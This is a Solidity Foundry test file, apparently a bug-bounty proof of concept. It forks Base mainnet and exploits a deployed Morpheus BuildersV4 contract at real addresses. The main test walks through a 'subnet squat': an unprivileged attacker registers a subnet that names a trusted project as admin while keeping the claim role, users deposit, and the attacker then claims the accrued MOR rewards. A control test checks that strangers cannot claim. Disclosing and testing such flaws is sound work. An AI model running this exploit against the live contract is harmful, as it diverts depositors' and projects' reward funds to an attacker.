// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

interface IBuildersV4 {
    struct Subnet {
        string name;
        address admin;
        uint128 unusedStorage1_V4Update;
        uint128 withdrawLockPeriodAfterDeposit;
        uint128 unusedStorage2_V4Update;
        uint256 minimalDeposit;
        address claimAdmin;
    }
    struct SubnetMetadata {
        string slug;
        string description;
        string website;
        string image;
    }
    function createSubnet(Subnet calldata subnet_, SubnetMetadata calldata metadata_) external;
    function deposit(bytes32 subnetId_, uint256 amount_) external;
    function claim(bytes32 subnetId_, address receiver_) external;
    function getSubnetId(string memory subnetName_) external view returns (bytes32);
    function getCurrentSubnetRewards(bytes32 subnetId_) external view returns (uint256);
    function subnets(bytes32 subnetId_)
        external
        view
        returns (
            string memory name,
            address admin,
            uint128,
            uint128 withdrawLockPeriodAfterDeposit,
            uint128,
            uint256 minimalDeposit,
            address claimAdmin
        );
}

/// @notice MORPHEUS BuildersV4 subnet-squat PoC (Base fork, pinned block).
/// @dev An unprivileged attacker creates a subnet naming a trusted project as
///      `admin` while keeping `claimAdmin` for themselves. `createSubnet` never
///      checks msg.sender against either role. Users deposit because the stored
///      admin is the trusted project; `claim()` then pays the subnet's MOR
///      rewards to the attacker. No privileged account is used anywhere.
contract BuildersSubnetSquatTest is Test {
    address constant BUILDERS = 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9;
    address constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;
    uint256 constant BLOCK = 55477144;

    address attacker = makeAddr("attacker");
    address victimAdmin = makeAddr("victimAdmin");
    address user = makeAddr("user");

    function setUp() public {
        vm.createSelectFork("https://base-rpc.publicnode.com", BLOCK);
        vm.deal(attacker, 10 ether);
        vm.deal(victimAdmin, 10 ether);
        vm.deal(user, 10 ether);
        // Test capital for the simulated user deposit (anyone can buy MOR).
        deal(MOR, user, 100_000 ether);
    }

    function testSubnetSquatClaimStealsRewards() public {
        IBuildersV4 builders = IBuildersV4(BUILDERS);
        string memory name = "AcmeAI-Subnet-Squat-0xpack";

        bytes32 subnetId = builders.getSubnetId(name);
        (, address adminBefore, , , , , address claimAdminBefore) = builders.subnets(subnetId);
        assertEq(adminBefore, address(0), "subnet name must be fresh");

        // 1. Attacker (unprivileged, never authorized by victimAdmin) creates
        //    the subnet: admin = trusted project, claimAdmin = attacker.
        //    subnetCreationFeeAmount is 0 on-chain, so squatting is free.
        IBuildersV4.Subnet memory subnet = IBuildersV4.Subnet({
            name: name,
            admin: victimAdmin,
            unusedStorage1_V4Update: 0,
            withdrawLockPeriodAfterDeposit: 604800,
            unusedStorage2_V4Update: 0,
            minimalDeposit: 1 ether,
            claimAdmin: attacker
        });
        IBuildersV4.SubnetMetadata memory meta = IBuildersV4.SubnetMetadata({
            slug: "acmeai",
            description: "AcmeAI builders subnet",
            website: "https://example.com",
            image: ""
        });
        vm.prank(attacker);
        builders.createSubnet(subnet, meta);

        (, address adminAfter, , , , , address claimAdminAfter) = builders.subnets(subnetId);
        assertEq(adminAfter, victimAdmin, "stored admin is the trusted project");
        assertEq(claimAdminAfter, attacker, "attacker holds claimAdmin");

        // 2. A user deposits, trusting the stored admin. Attacker cannot
        //    touch the deposit itself; the theft is the reward stream.
        vm.startPrank(user);
        IERC20(MOR).approve(BUILDERS, 100_000 ether);
        builders.deposit(subnetId, 100_000 ether);
        vm.stopPrank();

        // 3. Rewards accrue (Builder bucket emits ~100k MOR/month, 80% share).
        vm.warp(block.timestamp + 30 days);
        uint256 pending = builders.getCurrentSubnetRewards(subnetId);
        console.log("pending subnet rewards (MOR):", pending / 1 ether);
        assertGt(pending, 0, "no rewards accrued");

        // 4. Attacker claims the subnet rewards to themselves. The victim
        //    admin never authorized the attacker and never signed anything.
        uint256 attackerBefore = IERC20(MOR).balanceOf(attacker);
        vm.prank(attacker);
        builders.claim(subnetId, attacker);
        uint256 stolen = IERC20(MOR).balanceOf(attacker) - attackerBefore;
        console.log("MOR claimed by attacker:", stolen / 1 ether);
        assertGt(stolen, 0, "attacker claimed nothing");

        // 5. The victim admin receives nothing from this claim.
        assertEq(IERC20(MOR).balanceOf(victimAdmin), 0, "victim admin got funds");
    }

    function testControlNonPrivilegedCannotClaim() public {
        IBuildersV4 builders = IBuildersV4(BUILDERS);
        string memory name = "AcmeAI-Subnet-Squat-0xpack";
        bytes32 subnetId = builders.getSubnetId(name);

        IBuildersV4.Subnet memory subnet = IBuildersV4.Subnet({
            name: name,
            admin: victimAdmin,
            unusedStorage1_V4Update: 0,
            withdrawLockPeriodAfterDeposit: 604800,
            unusedStorage2_V4Update: 0,
            minimalDeposit: 1 ether,
            claimAdmin: attacker
        });
        IBuildersV4.SubnetMetadata memory meta = IBuildersV4.SubnetMetadata({
            slug: "acmeai",
            description: "AcmeAI builders subnet",
            website: "https://example.com",
            image: ""
        });
        vm.prank(attacker);
        builders.createSubnet(subnet, meta);

        // A random third party (neither admin nor claimAdmin) cannot claim.
        address stranger = makeAddr("stranger");
        vm.prank(stranger);
        vm.expectRevert("BU: invalid caller");
        builders.claim(subnetId, stranger);
    }
}
